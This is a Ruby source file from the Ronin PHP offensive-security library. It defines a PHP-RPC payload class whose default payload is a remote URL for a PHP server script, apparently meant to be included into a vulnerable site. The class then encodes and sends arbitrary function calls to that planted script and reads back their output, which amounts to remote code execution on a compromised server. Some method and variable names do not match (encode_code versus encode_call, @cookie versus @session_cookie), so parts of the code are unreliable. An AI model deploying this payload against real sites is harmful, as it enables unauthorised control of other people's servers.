#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/payloads/web'

require 'uri/query_params'
require 'ffi/msgpack'
require 'base64'

module Ronin
  module Payloads
    module PHP
      class RPC < Web

        SCRIPT_URL = 'http://github.com/ronin-ruby/ronin-php/raw/master/data/ronin/php/rpc/server.php'

        #
        # Creates a new PHP-RPC payload object.
        #
        # @yield []
        #   The given block will be used to create a new PHP-RPC
        #   payload object.
        #
        # @return [Ronin::Payloads::PHP::RPC]
        #   The new PHP-RPC payload object.
        #
        # @example
        #   ronin_php_rpc do
        #     cache do
        #       self.name = 'another PHP-RPC'
        #       self.description = %{
        #         This is another PHP-RPC payload.
        #       }
        #     end
        #
        #     def build
        #     end
        #
        #     def deploy
        #     end
        #   end
        #
        contextify :ronin_php_rpc

        parameter :script_url, :default => SCRIPT_URL,
                               :description => 'URL of the PHP-RPC Script'

        def initialize(attributes={})
          super(attributes)

          @session_cookie = nil
          @session_state = {}

          # default the raw-payload to the script URL
          @raw_payload = self.script_url
        end

        #
        # Generates a URL for a function call.
        #
        # @param [String, Symbol] function
        #   The function to call.
        # 
        # @param [Array] arguments
        #   The arguments to call the function with.
        #
        # @return [URI::HTTP]
        #   The URL for the function call.
        #
        # @since 0.2.0
        #
        def call_url(function,*arguments)
          new_url = URI(@url.to_s)
          new_url.query_params['rpcrequest'] = encode_code(function,*arguments)

          return new_url
        end

        protected

        # Valid response types
        VALID_RESPONSE_TYPES = Set['error', 'return']

        # Valid response keys for the response types
        VALID_RESPONSE_KEYS = {
          'error' => Set['message'],
          'return' => Set[
            'state',
            'output',
            'return_value'
          ]
        }

        #
        # Encodes the function call along with additional state information.
        #
        # @param [Hash] state
        #   Additional state information to encode.
        #
        # @return [String]
        #   Base64 / MessagePack encoded PHP-RPC method call.
        #
        # @since 0.2.0
        #
        def encode_call(function,*arguments)
          Base64.encode64(FFI::MsgPack.pack(
            'state' => @session_state,
            'name' => function,
            'arguments' => arguments
          ))
        end

        def send_call(function,*arguments)
          resp = http_get(
            :url => call_url(function,*arguments),
            :cookie => @session_cookie
          )

          new_cookie = resp['Set-Cookie']
          @cookie = new_cookie if new_cookie

          return Response.new(resp.body)
        end

        #
        # Decodes the Base64 / MessagePack response embedded in the
        # response from the server.
        #
        # @return [Hash]
        #   The type and additional parameters in the response.
        #
        # @raise [RuntimeError]
        #   The response does not contain any information or was malformed.
        #
        # @since 0.2.0
        #
        def decode_response(response)
          match = response.match(/<rpc-response>(.*)<\/rpc-response>/m)

          unless (match && match[1])
            raise(RuntimeError,"failed to receive a valid RPC response")
          end

          response = FFI::MsgPack.unpack(Base64.decode64(match[1]))

          unless response.kind_of?(Hash)
            raise(RuntimeError,"decoded RPC response was not a Hash")
          end

          unless response['type']
            raise(RuntimeError,"decoded RPC response does not have a 'type' key")
          end

          unless VALID_RESPONSE_TYPES.include?(response['type'])
            raise(RuntimeError,"invalid RPC response type #{response['type'].dump}")
          end

          VALID_RESPONSE_KEYS[response['type']].each do |key|
            unless response.has_key?(key)
              raise(RuntimeError,"decoded RPC response does not have a #{key.dump} key")
            end
          end

          return response
        end

        #
        # Returns the return-value of a previous function from a given
        # response.
        #
        # @param [Response] response
        #   The response to decode.
        #
        # @return [Object]
        #   The return value from the response.
        #
        # @raise [Exception]
        #   If the response represents an exception, an equivalent Ruby
        #   exception will be raised.
        #
        # @since 0.2.0
        #
        def return_value(response)
          response = response.decode

          if response['type'] == 'error'
            raise(response['message'])
          end

          @session_state.merge!(response['state'])

          unless response['output'].empty?
            print(response['output'])
          end

          return response['return_value']
        end

      end
    end
  end
end
